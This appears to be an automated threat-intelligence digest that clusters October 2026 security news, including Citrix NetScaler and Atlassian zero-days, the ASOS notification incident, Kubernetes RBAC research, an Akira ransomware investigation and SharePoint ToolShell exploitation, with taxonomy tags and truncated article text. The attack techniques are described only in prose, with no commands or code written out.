  - Link: https://www.bleepingcomputer.com/news/security/hackers-exploit-critical-atlassian-flaw-after-public-poc-release/
  - Summary: A critical vulnerability (CVE-2026-21589) affecting multiple Atlassian product families, including Jira, Confluence, and Bitbucket, is being exploited in attacks that do not require authentication. [...]
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Atlassian Data Center Flaw Draws Exploitation Attempts Within Two Hours of Public Details
  - Published: 2026-10-07T11:49:26+00:00
  - Link: https://thehackernews.com/2026/10/atlassian-data-center-flaw-draws.html
  - Summary: Threat actors have begun to exploit a newly disclosed critical security flaw impacting Atlassian Data Center products that could allow access to sensitive files under certain conditions. The arbitrary file access flaw, tracked as CVE-2026-21589 (CVSS score: 9.3) affects multiple products, including Bitbucket Data Center, Confluence Data Center, Jira Service Management Data Center, Jira Software

### Cluster 257c7d4fe7 — score 19

- Title: Citrix discloses third actively exploited NetScaler zero-day in less than a week
- Source: CyberScoop (cyber_news_breach_reporting)
- Published: 2026-10-05T23:07:17+00:00
- Link: https://cyberscoop.com/citrix-netscaler-third-exploited-zero-day-vulnerability/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ddos, zero_day
- affected_products: Citrix
- cve_ids: CVE-2026-88771, CVE-2026-88779
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, ddos, active_exploitation
- affected_products: Citrix
- cve_ids: CVE-2026-88779, CVE-2026-88771
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The vendor was much quicker and consistent in its response to the latest defect, and researchers consider the impact relatively low compared to the previous pair of zero-days. The post Citrix discloses third actively exploited NetScaler zero-day in less than a week appeared first on CyberScoop .
```

#### Full body

```
Advertisement Get our latest cybersecurity news first on Google. Click here! Close Citrix customers just got through back-to-back weekends filled with varying levels of uncertainty and worry, as yet another actively exploited zero-day vulnerability was discovered in Citrix NetScaler products. Researchers and security experts said the vulnerability — CVE-2026-88779 — is less concerning because exploitation triggers denial of service and only impacts instances that have SAML (security assertion markup language) enabled. “This means it doesn’t work out of the box against every NetScaler deployment,” Jake Knott, head of threat intelligence at watchTowr, told CyberScoop. “While this is very inconvenient, it doesn’t have organizations scrambling to trigger incident response.” Citrix was much quicker and consistent in alerting customers to the emerging threat Friday, and followed up the next day with a more detailed blog post and security advisory that contained a patch for the high-severity defect. Advertisement “After we were alerted to this issue we immediately developed and published a mitigation while concurrently developing, testing and deploying a fix,” a company spokesperson said in a statement. “The fix for this issue is available, and we urge all customers to quickly apply it to their NetScaler instance.” The Cybersecurity and Infrastructure Security Agency added the defect to its known exploited vulnerabilities catalog Sunday. The vendor’s response also provided some relief for customers and researchers who spent much of the previous weekend rushing to assess widespread rumors of other defects in the assailed network edge gateways. In that case, Citrix took most of the weekend to confirm attackers were actively exploiting a pair of NetScaler zero-days, some of which researchers said remained undetected for at least three weeks . “Citrix did a better job with their response to this vulnerability,” and took steps that enabled customers to make their own risk-based decisions with more currently available information, said Joe Toomey, vice president of underwriting security at insurance provider Coalition. “Although it’s difficult to celebrate given this is the third publicly-exploited NetScaler zero-day vulnerability in a two-week window, it is a step in the right direction,” he added. Advertisement Citrix declined to say how many customers are impacted by the latest zero-day or when the first instance of exploitation occurred. Yet, Knott at watchTowr said exploitation likely began Friday. The newer defect doesn’t share any technical links with the pair of zero-days Citrix disclosed less than a week prior, but it can accelerate one of those vulnerabilities — CVE-2026-88771 — by intentionally crashing machines to speed up exploitation, Knott said. While risk is currently perceived low for CVE-2026-88779, it is “incredibly simple to trigger, with a single specially crafted request being all that is needed to knock an appliance offline,” Knott added. “Exploitation is already occurring in the wild, and disrupting an authentication gateway can prevent legitimate users from accessing the services behind it.” Toomey also described the denial-of-service vulnerability as less serious than the previous week’s actively exploited zero-days. Yet, he noted, exploitation attempts of CVE-2026-88779 “clearly contain shellcode that implies that the threat actor believes they can use this vulnerability, or chain it with another vulnerability, in order to achieve remote-code execution.” Share Facebook LinkedIn Twitter Copy Link Add to Preferred Sources Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops Hackers stealing data concept. (Getty Images) Citrix office complex in Santa Clara, California. ( Justin Sullivan/Getty Images) (Getty Images) Latest Podcasts What the Section 702 lapse means for cybersecurity What AI alignment means for cybersecurity Jailbreaks, sandboxes, and the limits of AI safeguard
```

#### Corroborating sources (1)

- **CyberScoop** (cyber_news_breach_reporting)
  - Title: Citrix discloses third actively exploited NetScaler zero-day in less than a week
  - Published: 2026-10-05T23:07:17+00:00
  - Link: https://cyberscoop.com/citrix-netscaler-third-exploited-zero-day-vulnerability/
  - Summary: The vendor was much quicker and consistent in its response to the latest defect, and researchers consider the impact relatively low compared to the previous pair of zero-days. The post Citrix discloses third actively exploited NetScaler zero-day in less than a week appeared first on CyberScoop .

### Cluster e0b5b97ad2 — score 19

- Title: ⚡ Weekly Recap: NetScaler and FortiMail 0-Days, AI Coding Leaks, Spectre v2 and Ransomware Arrests
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-05T14:20:43+00:00
- Link: https://thehackernews.com/2026/10/weekly-recap-netscaler-and-fortimail-0.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ddos, ransomware_extortion, zero_day
- actor_attribution: Cl0p, ShinyHunters
- affected_industries: government
- affected_products: Citrix, Fortinet
- cve_ids: CVE-2026-104286, CVE-2026-88779
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, ddos, active_exploitation
- actor_attribution: ShinyHunters, Cl0p
- affected_industries: government
- affected_products: Citrix, Fortinet
- cve_ids: CVE-2026-88779, CVE-2026-104286
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
A blank field. A public repo. One reply to an email. A box left exposed. None of this sounds dramatic, which is partly the problem. This week’s threats keep finding leverage in small things that were easy to overlook. There are actively exploited bugs in the mix, cleaner intrusion paths, smarter automation, and a long patch list waiting behind them. Some attacks are getting more capable. Others
```

#### Full body

```
⚡ Weekly Recap: NetScaler and FortiMail 0-Days, AI Coding Leaks, Spectre v2 and Ransomware Arrests  Ravie Lakshmanan  Oct 05, 2026 Cybersecurity News / Hacking A blank field. A public repo. One reply to an email. A box left exposed. None of this sounds dramatic, which is partly the problem. This week’s threats keep finding leverage in small things that were easy to overlook. There are actively exploited bugs in the mix, cleaner intrusion paths, smarter automation, and a long patch list waiting behind them. Some attacks are getting more capable. Others are still getting in because the basics gave way first. Here’s what mattered this week. ⚡ Threat of the Week Citrix Warns of Newly Exploited NetScaler ADC and Gateway Flaw — Citrix released security updates for a high-severity security flaw in NetScaler ADC and NetScaler Gateway that has been exploited as part of targeted zero-day attacks. The vulnerability, tracked as CVE-2026-88779, carries a CVSS score of 8.7 out of 10.0. "CVE-2026-88779 is a memory overflow vulnerability in Citrix NetScaler ADC and Citrix NetScaler Gateway that can lead to denial-of-service under specific deployment conditions," Citrix said. "The issue affects customer-managed NetScaler deployments running affected supported versions when the required preconditions are met." Successful exploitation requires NetScaler ADC or NetScaler Gateway to be configured either as a SAML service provider (SP) or SAML identity provider(IdP). How Headspace Centralized AI Governance Across Teams Most teams are stuck choosing between speed and control. Headspace found a way to have both. Hear how Chris Oh, Senior Director of AI Enablement at Headspace, gives the org flexibility to build, while maintaining full visibility into what’s running and who owns it. Watch the On-Demand Webinar Here ➝ 🔔 Top News Critical FortiMail Zero-Day Flaw Exploited in Attacks — The U.S. Cybersecurity and Infrastructure Security Agency (CISA) warned of active exploitation of a critical security flaw impacting Fortinet FortiMail. The flaw, CVE-2026-104286 (CVSS score: 9.8), allows unauthenticated attackers to write arbitrary files on the underlying system. According to Fortinet, the vulnerability "may allow an unauthenticated attacker to write arbitrary files on the underlying system via crafted HTTP or HTTPS requests." Two ShinyHunters Members Arrested — Law enforcement agencies have arrested two members associated with the ShinyHunters digital extortion group. One of them is a 24-year-old Amsterdam man, who is believed to be Pepijn van der Stap, while the second individual is Saif ‌al-Din Khader, who is said to have been detained by Jordanian authorities last week. ShinyHunters has drawn attention in recent weeks for hijacking the darknet website of Cl0p and its hack of the FBI's "apply.fbijobs[.]gov" portal. Authorities Arrest 16-Year-Old Mastermind Behind KillSec — Police in Spain apprehended a 16-year-old who is suspected to be the leader of the KillSec (aka Kill Security Ransomware Group) ransomware operation. According to Europol, authorities took control of KillSec's leak site on September 30, 2026, securing no less than 110 terabytes of data. As part of Operation KillSwitch, a total of three suspects were provisionally arrested and eight properties searched in Greece, Romania, Spain, and the U.K. One of the group’s accused members, Fouad Eltibrizi, was arrested in the U.K. and is awaiting extradition to the U.S. Since emerging in 2024, the group is estimated to have launched around 1,000 attacks, at least half of which were successful. "The group exploited software vulnerabilities and poorly secured access points, particularly to cloud storage, to gain access to organizations' systems," Europol said . "Its members then copied sensitive internal data to infrastructure under their control. Victims were named on the group's dark web leak site and threatened with publication of their data unless paid." Per Group-IB, which identified 274 publ
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: ⚡ Weekly Recap: NetScaler and FortiMail 0-Days, AI Coding Leaks, Spectre v2 and Ransomware Arrests
  - Published: 2026-10-05T14:20:43+00:00
  - Link: https://thehackernews.com/2026/10/weekly-recap-netscaler-and-fortimail-0.html
  - Summary: A blank field. A public repo. One reply to an email. A box left exposed. None of this sounds dramatic, which is partly the problem. This week’s threats keep finding leverage in small things that were easy to overlook. There are actively exploited bugs in the mix, cleaner intrusion paths, smarter automation, and a long patch list waiting behind them. Some attacks are getting more capable. Others

### Cluster cc01b95e10 — score 18

- Title: The ASOS Incident: When Attackers Use the Channels Customers Trust
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-10-07T10:40:07+00:00
- Link: https://www.rapid7.com/blog/post/it-asos-incident-attackers-using-channels-customers-trust
- Fetch status: ok
- Member count: 3
- Corroborating source count: 3
- Strong signals: Snowflake

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_products: Snowflake
- content_type: news_report
- confidence_tier: tier_1_offensive_research, tier_4_news, tier_5_chatter

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_products: Snowflake
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
This week, ASOS customers opened their phones to find a hostile push notification delivered through the retailer’s own app. The message claimed the company’s Snowflake environment had been compromised and directed ASOS to engage with the sender through Telegram. ASOS later confirmed to Sky News that an unauthorized customer notification had been sent and said it was investigating activity involving third-party platforms used to communicate with customers. The company also said basic personal information, including names and contact details, may have been accessed, while payment-card information and account passwords were not believed to be affected. The attackers’ wider claims remain unverified, and Snowflake told Sky News that its investigation had found no compromise of the Snowflake platform at that point. Even without knowing the full route into ASOS’s environment, though, the notification raises a useful question for security teams: what happens when an attacker can communicate th
```

#### Full body

```
Hacking The ASOS incident: When attackers use the channels customers trust Emma Burdett Oct 7, 2026 | Last updated on Oct 7, 2026 | 5 min read DISCOVER RAPID7 INTELLIGENCE The ASOS incident: When attackers use the channels customers trust Table of contents The ASOS incident: When attackers use the channels customers trust DISCOVER RAPID7 INTELLIGENCE Table of contents ASOS customers opened their phones to find a hostile push notification delivered through the retailer’s own app. The message claimed the company’s Snowflake environment had been compromised and directed ASOS to engage with the sender through Telegram. ASOS later confirmed to Sky News that an unauthorized customer notification had been sent and said it was investigating activity involving third-party platforms used to communicate with customers. The company also said basic personal information, including names and contact details, may have been accessed, while payment-card information and account passwords were not believed to be affected. The attackers’ wider claims remain unverified, and Snowflake told Sky News that its investigation had found no compromise of the Snowflake platform at that point. Even without knowing the full route into ASOS’s environment, though, the notification raises a useful question for security teams: what happens when an attacker can communicate through a channel customers already trust? When the message comes from the real app Most security awareness advice assumes there will be something suspicious for the recipient to notice. The sender might be unfamiliar, the domain slightly wrong, or the request out of character. Those checks become much less useful when the message arrives through the genuine app sitting on someone’s phone. Attackers have already been moving in this direction elsewhere. Rapid7 research into calendar-based phishing showed how malicious content can appear inside familiar workflows, while our earlier look at how social engineering is evolving explored the growing use of collaboration tools and other everyday platforms to make attacks feel routine. The ASOS incident moves that problem into a customer-facing environment. Once an attacker has access to a system that can speak on behalf of a business, the trust built around that system can work in the attacker’s favor too. "Let's face it, an attacker would much rather borrow trust that already exists than spend time building their own. Our recent Zimbra research is a good example, because once you can impersonate a sender or edit a calendar from inside the platform, everything the victim checks lives in a system they have no reason to question. I can't say how this one happened, but a notification coming out of a real app gives an attacker that same head start. There is no strange domain or unfamiliar sender to catch, so the activity can look a lot like a normal Tuesday afternoon." Douglas McKee, Director, Vulnerability Intelligence at Rapid7 What suspicious activity looks like inside legitimate services An attacker does not always need obviously malicious infrastructure to create damage. A legitimate account, integration, or SaaS platform used in an unexpected way can provide access to employees, customers, or partners while generating activity that may look relatively ordinary when viewed on its own. If a customer communications service suddenly sends an unusual notification, the security team needs to understand what happened around it: who accessed the platform, whether credentials or permissions changed, which connected services were involved, and whether suspicious activity appeared elsewhere in the environment. ASOS said the activity involved third-party platforms used for customer communications, while TechRadar reported that the claimed Snowflake connection could potentially have been indirect through services running on the platform rather than evidence of a compromise of Snowflake itself. That kind of environment can leave investigators working across several
```

#### Corroborating sources (3)

- **Rapid7** (offensive_vulnerability_research)
  - Title: The ASOS Incident: When Attackers Use the Channels Customers Trust
  - Published: 2026-10-07T10:40:07+00:00
  - Link: https://www.rapid7.com/blog/post/it-asos-incident-attackers-using-channels-customers-trust
  - Summary: This week, ASOS customers opened their phones to find a hostile push notification delivered through the retailer’s own app. The message claimed the company’s Snowflake environment had been compromised and directed ASOS to engage with the sender through Telegram. ASOS later confirmed to Sky News that an unauthorized customer notification had been sent and said it was investigating activity involving third-party platforms used to communicate with customers. The company also said basic personal information, including names and contact details, may have been accessed, while payment-card information and account passwords were not believed to be affected. The attackers’ wider claims remain unverified, and Snowflake told Sky News that its investigation had found no compromise of the Snowflake platform at that point. Even without knowing the full route into ASOS’s environment, though, the notification raises a useful question for security teams: what happens when an attacker can communicate th
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: ASOS Customers Receive Bizarre “Hacked” Message Amid Suspected Snowflake Compromise
  - Published: 2026-10-06T11:41:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/asos-customers-message-suspected/
  - Summary: ASOS customers have received a seemingly legitimate push notifications claiming the retailer’s IT systems have been breached through a Snowflake breach
- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - Title: Looks like ASOS in the UK just got breached again
  - Published: 2026-10-06T09:04:49+00:00
  - Link: https://www.reddit.com/r/cybersecurity/comments/1wyxsx7/looks_like_asos_in_the_uk_just_got_breached_again/
  - Summary: My partner just got a push notification https://i.ibb.co/35Gt5zXQ/signal-2026-10-06-09-59-02-887.jpg Apparently their Snowflake instance is compromised and they have access to push notifications too submitted by /u/ansibleloop [link] [comments]

### Cluster 2c9fe9c79f — score 16

- Title: Guarding the gates: Assessing dangerous permissions granted to Kubernetes built-in principals
- Source: Datadog Security Labs (cloud_identity_infrastructure)
- Published: 2026-10-05T00:00:00+00:00
- Link: https://securitylabs.datadoghq.com/articles/kubernetes-rbac-built-in-principals-dangerous-permissions/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- urgency_signals: preauth_unauth
- content_type: threat_research
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- urgency_signals: preauth_unauth
- content_type: threat_research
- confidence_tier: tier_2_operator

#### Summary

```
We analyzed RBAC bindings across over 65,000 Kubernetes clusters to find dangerous permissions granted to system:anonymous, system:unauthenticated, and system:authenticated.
```

#### Full body

```
Rory McCune Senior Advocate - Security & Compliance Div Savla Data Analyst Kubernetes authorization is a vital but complex part of cluster security, where mistakes can have serious consequences in allowing attackers to establish and expand their access to critical resources. With that in mind we decided to examine how role-based access control (RBAC) is configured in real-world clusters. Specifically, we looked at bindings that can grant some of the built-in principals wide-ranging access to cluster resources. We examined over 65,000 clusters from almost 10,000 organizations to understand what the real-world usage of these principals looked like. Background: How do Kubernetes built-in principals work? Kubernetes provides a number of built-in users and groups that can have permissions assigned to them. Unauthenticated users who make requests to the Kubernetes API server are assigned a username of system:anonymous and a group of system:unauthenticated . As such, any permissions granted to those subjects are given to any caller who can reach the API server at a network level. In most clusters, these permissions allow access to endpoints such as /healthz , which is used for cluster monitoring. However, there are some configuration options that change how the API server handles requests without credentials. If the API server has --anonymous-auth=false set, then requests without credentials will always be rejected. Additionally, Kubernetes v1.34 introduced a feature that allows cluster administrators to restrict anonymous access to a specific list of paths, regardless of what RBAC settings are in place. The third principal that we're looking at in this blog post, system:authenticated , is a group that includes every user with valid credentials for the cluster. Administrators can use this group to grant permissions that every authenticated user in the cluster requires. Distribution defaults Of course, most clusters do not run on upstream Kubernetes but instead use one of the available Kubernetes distributions. In our dataset, most of the clusters ran on Amazon Elastic Kubernetes Service (Amazon EKS), Google Kubernetes Engine (GKE), or Microsoft's Azure Kubernetes Service (AKS), so it's worth mentioning the relevant access-control defaults for each before getting into the data: AKS is one of the few distributions that uses the --anonymous-auth=false setting. So, any permissions granted to the anonymous principals have no effect, and an AKS API server will reject any request without valid credentials. EKS allows anonymous access. However, since v1.32 (before the upstream feature was generally available), EKS has restricted the endpoints that can be exposed without credentials. As a result, bindings to the anonymous principals don't have any effect. GKE allows anonymous access and, like EKS, limits the endpoints that can be accessed without credentials (but from v1.35 in this case). GKE also has an unusual way of handling access to system:authenticated , as by default it allows any user with a valid Google account to have that access to any GKE cluster. (More details are available in Orca's research post on the topic.) It is now possible to block access from arbitrary Google accounts at cluster creation, but the default still stands. Data analysis With the background information covered, what did we see in our data? Across the clusters in the dataset, there were over 320,000 bindings to one of the three principals we're focusing on. Of those, we eliminated 265,000 because they were the default bindings that ship with base Kubernetes ( system:basic-user , system:discovery , and system:public-info-viewer ). That left us about 55,000 bindings to analyze. Filtering 320,000+ bindings to built-in principals down to 3,500+ dangerous grants (click to enlarge) The next group that we excluded was interesting: 11,000 bindings related to podsecuritypolicy objects. Kubernetes Pod Security Policies were removed as a feature in Kubernetes v1.25, which
```

#### Corroborating sources (1)

- **Datadog Security Labs** (cloud_identity_infrastructure)
  - Title: Guarding the gates: Assessing dangerous permissions granted to Kubernetes built-in principals
  - Published: 2026-10-05T00:00:00+00:00
  - Link: https://securitylabs.datadoghq.com/articles/kubernetes-rbac-built-in-principals-dangerous-permissions/
  - Summary: We analyzed RBAC bindings across over 65,000 Kubernetes clusters to find dangerous permissions granted to system:anonymous, system:unauthenticated, and system:authenticated.

### Cluster f273b2b0d8 — score 15

- Title: Up a Creek Without a Command Line: Mapping an Akira Ransomware Attack
- Source: Huntress (detection_response_operations)
- Published: 2026-10-06T13:00:00+00:00
- Link: https://www.huntress.com/blog/mapping-akira-ransomware-attack
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Akira

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, ransomware_extortion
- actor_attribution: Akira
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- content_type: incident_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, credential_theft
- actor_attribution: Akira
- affected_products: OpenAI/ChatGPT, Anthropic/Claude
- content_type: incident_report
- confidence_tier: tier_2_operator

#### Summary

```
How Huntress researchers reconstructed an Akira ransomware attack using Registry artifacts, Akira logs, and other post-compromise evidence.
```

#### Full body

```
Home Blog Up a Creek Without a Command Line: Mapping an Akira Ransomware Attack Published: October 6, 2026 Up a Creek Without a Command Line: Mapping an Akira Ransomware Attack By: Harlan Carvey Lindsey O'Donnell-Welch Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Key Takeaways In September, the Huntress agent was deployed on an organization that had been hit by an Akira ransomware attack. The post-compromise agent deployment limited Huntress visibility into critical pieces of evidence. An investigation into the impacted endpoint revealed that the threat actor behind the attack accessed the endpoint via Remote Desktop Protocol (RDP), disabled antivirus, and deployed Rclone for data exfiltration, before deploying the ransomware. The actor also deployed a GOST tunneling tool, likely for persistence. Collecting and reviewing a number of forensic artifacts from the impacted endpoint(s) allowed Huntress analysts to piece together some indications of the threat actor/affiliates activities. Acknowledgments : Special thanks to Dray Agha for his extensive contributions to this investigation. Background In September, the Huntress agent was deployed on an organization that had been targeted in an Akira ransomware attack. As we've written about previously, the Huntress agent is sometimes deployed after an attacker had already accessed or compromised the environment. This sometimes happens in response to an incident; other times an organization is still rolling out the agent when the compromise is discovered. Regardless, a post-compromise agent install may limit important EDR telemetry from the initial access, earlier reconnaissance, persistence, or credential theft that happened before installation. However, one limited telemetry stream does not mean that there aren't important clues in other places that can build a picture about what happened during the incident. In this incident, Huntress researchers were able to piece together multiple sources archeology-style—including Registry data, Akira log files, and more—in order to map out what happened during some parts of the attack. For example, even without a recorded ransomware command line, the timeline provides strong evidence of execution: Shellbags show the threat actor accessed the folder, an Akira log file indicates the ransomware targeted it, and a concurrent PowerShell command removed volume shadow copies, a common Akira action. The incident: what we worked with After the Huntress agent was installed in early September, an EDR signal was generated on a domain controller, picking up on the very tip of the iceberg of the activity. As seen in Figure 1, the signal shows svchost.exe being executed from C:\PerfLogs\Temp\ directory under the SYSTEM account, loading config.dll . Figure 1: An EDR signal alerting of threat actor activity after the Huntress agent was installed post-compromise It's worth noting that this signal is indicating one part of the attack at the point in time after the Huntress agent was installed. Had it been installed earlier, the agent would have picked up on other indicators of malicious activity. This would help to tip off the organization that they were being attacked so that they could jump on the incident to stop it. But from an investigation standpoint, it would also give us a deeper understanding of what happened: what the threat actor was doing and how they got in in the first place, which would help inform the impacted organization of which areas to focus on during remediation. The Investigation With the lack of the EDR telemetry and detections, our researchers had to make do with what was available from the impacted endpoints: a mixed bag of Windows Registry artifacts, Windows Event Logs, and Akira log files. However, these artifacts helped paint a picture of the threat actor's activity. The Windows Event Logs showed that the threat actor accessed the impacted endpoint via Terminal Services/RDP , from a workstation not owned by the custom
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Up a Creek Without a Command Line: Mapping an Akira Ransomware Attack
  - Published: 2026-10-06T13:00:00+00:00
  - Link: https://www.huntress.com/blog/mapping-akira-ransomware-attack
  - Summary: How Huntress researchers reconstructed an Akira ransomware attack using Registry artifacts, Akira logs, and other post-compromise evidence.

### Cluster 7c42269e48 — score 15

- Title: ToolShell, SharePoint, and the Death of the Patch Window
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-01T20:59:50+00:00
- Link: https://www.team-cymru.com/post/toolshell-sharepoint-and-the-death-of-the-patch-window
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: Microsoft SharePoint

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, ransomware_extortion, zero_day
- actor_attribution: APT27, APT31
- affected_industries: critical_infrastructure, education, government
- affected_products: GitHub, Microsoft SharePoint
- cve_ids: CVE-2025-53770
- urgency_signals: no_patch_yet, poc_available, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, apt_espionage
- actor_attribution: APT27, APT31
- affected_products: Microsoft SharePoint, GitHub
- cve_ids: CVE-2025-53770
- urgency_signals: zero_day, preauth_unauth, no_patch_yet, poc_available
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
This blog explores this week's zero-day exploit targeting Microsoft SharePoint, now referred to as ToolShell, caught organizations off guard.
```

#### Full body

```
Eli Woodward 3 min read July 8, 2025 ToolShell, SharePoint, and the Death of the Patch Window Introduction This week‚Äôs zero-day exploit targeting Microsoft SharePoint, now referred to as ToolShell, caught organizations off guard. The exploit allowed unauthenticated remote code execution and quickly spread across unpatched SharePoint servers. Moreover, this incorporated a variant of previous vulnerabilities and resulted in the exploitation of an unpatched vulnerability. While this scenario is a security team‚Äôs nightmare (the mass exploitation of a zero-day), it does highlight a trend we‚Äôve been monitoring for several years - evidence of exploitation within Team Cymru‚Äôs data holdings prior to the availability of public exploit code. This type of insight is critical for defenders to be highly tuned into, because it demonstrates how fast and agile attackers have become and why they need to evolve their exposure discovery and related workflows to avert disaster. Old and busted: "Patch Within SLA." New paradigm: ‚ÄúPatch Now.‚Äù Our team has been studying how long it takes for exploit code to go from public release to real-world use. We track new PoC (proof-of-concept) exploit posts, then watch for signs of related activity in our data holdings. Our analysis found that, on average, exploitation tends to begin within three hours of public release. In some cases, we saw attacks begin before the PoC exploit code was even posted publicly. ToolShell was one of those cases. Source: https://github.com/soltanali0/CVE-2025-53770-Exploit/ ‚Äç Source: Pure Signal: Team Cymru Data We observed live exploitation on July 18th, 2025. The first case of PoC exploit code was not made public on GitHub until 21 July 2025. While this was a less common case of mass zero-day exploitation occurring, our data and tracking has shown organizations have mere hours in most cases to patch after exploit code becomes public. The Chinese Connection On 22 July 2025, the Microsoft Threat Intelligence team disclosed more details following their ongoing investigation into the ToolShell exploit campaign targeting on-premises SharePoint servers. Microsoft assesses that three China-nexus advanced persistent threat (APT) groups have been observed exploiting these vulnerabilities. This includes Linen Typhoon (also known as APT27 or Emissary Panda), Violet Typhoon (also known as APT31 or Judgement Panda), and a third group tracked as Storm-2603, which Microsoft also assesses to be a China-based adversary with medium confidence. The key takeaway from this pattern is that exploitation is now a collaborative and opportunistic process, not a linear one. Attackers don‚Äôt just wait for their zero-day to be discovered or for public proof-of-concept code to emerge‚Äîthey maximize the window of opportunity by sharing access and techniques within their circles as soon as they suspect the exploit will be exposed. We saw the same dynamic play out during the Hafnium Microsoft Exchange incident in 2021: once defenders started closing in, new intrusion sets appeared in our telemetry, evidence that the exploit was circulating between groups who wanted to extract every last bit of value before defenders could respond. ‚ÄúOur team sees this sequence repeat with almost every high-impact vulnerability‚Äîfirst a stealthy, targeted phase, then rapid escalation and mass exploitation as news breaks or defenders begin to mobilize.‚Äù ‚Äç Josh Hopkins, Team Cymru Threat Research team For defenders, this reality makes the old patching paradigm obsolete. If you‚Äôre waiting for public disclosure, scheduled patch windows, or even internal validation before acting, you are already behind the curve. The evidence shows that by the time an exploit is publicly known, your attack surface has likely already been tested‚Äîpossibly by multiple threat actors. Patching is not a box to tick off by next Friday. It‚Äôs a race against adversaries who move fast, share what works, and rarely give warning. The on
```

#### Corroborating sources (2)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: ToolShell, SharePoint, and the Death of the Patch Window
  - Published: 2026-10-01T20:59:50+00:00
  - Link: https://www.team-cymru.com/post/toolshell-sharepoint-and-the-death-of-the-patch-window
  - Summary: This blog explores this week's zero-day exploit targeting Microsoft SharePoint, now referred to as ToolShell, caught organizations off guard.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Warlock Exploits SharePoint Flaws to Disable Security Tools and Deploy Ransomware
  - Published: 2026-10-03T14:36:33+00:00
  - Link: https://thehackernews.com/2026/10/warlock-exploits-sharepoint-flaws-to.html
  - Summary: The suspected China-linked threat actor known as Warlock is still continuing to weaponize Microsoft SharePoint vulnerabilities, likely both old and new, in attacks targeting organizations in Portuguese- and Spanish-speaking countries. The activity, observed by the Symantec and Carbon Black Threat Hunter Team, has hit critical infrastructure, government, and education organizations. "In the

### Cluster 7f0055b51e — score 14

- Title: CISO perspectives on managing vulnerability risks in the age of AI
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-10-06T16:00:00+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/10/06/ciso-perspectives-on-managing-vulnerability-risks-in-the-age-of-ai/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- urgency_signals: no_patch_yet
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- urgency_signals: no_patch_yet
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Summary

```
Learn how CISOs can mitigate cybersecurity risks and increase resilience in the age of AI-powered vulnerability management. The post CISO perspectives on managing vulnerability risks in the age of AI appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Content types Best practices Topics AI and agents Office of the CISO Most of what has been written about AI and vulnerability management focuses on speed: how much faster frontier AI models can scan code, find weaknesses, design patches, and build exploits than any human team. That part is true, and it matters to how we remediate vulnerabilities. The more challenging question is what happens after the scan? Frontier AI models are about to hand every security team a far larger set of findings than they have ever had to work through. The real test for chief information security officers (CISOs) and IT security leaders is not how fast they can patch. It is whether they can keep the balance between patching quickly and patching correctly, at a scale no human review process was built for. This shift creates both new challenges and new opportunities. The same AI capabilities accelerating cyberattackers are also enabling defenders to identify exposures earlier, automate remediation, and build more resilient security programs. Not every vulnerability will be patched in time, so the controls that limit what an attacker can do by defense in depth matter more than ever. CISOs can dramatically improve the security posture of their Microsoft infrastructure by deploying Microsoft Baseline Security Mode (BSM) , building on how Microsoft protects Microsoft. Learn more about Microsoft Baseline Security Mode How do frontier AI models change vulnerability management for CISOs? Microsoft uses frontier AI models to find vulnerabilities in its code base and mitigate them at controlled pace. Potential vulnerabilities are reviewed on validity, severity, and potential impact. As we have explained in previous blogs, many steps in our vulnerability handling and disclosure processes now are AI-powered , allowing them to scale . Most vulnerabilities in cloud software are being mitigated by Microsoft without customer intervention. For on-premises Microsoft software, customers should continue to expect a substantial increase in the number of vulnerabilities released on Patch Tuesdays relative to historic volumes before the advent of frontier AI models earlier this year—September 2026 saw a record number, close to 1,000. 1 Due to the non-deterministic nature of AI models, different runs by the same model or with different models may yield different results. With better models becoming available over time, AI-powered vulnerability scanning of 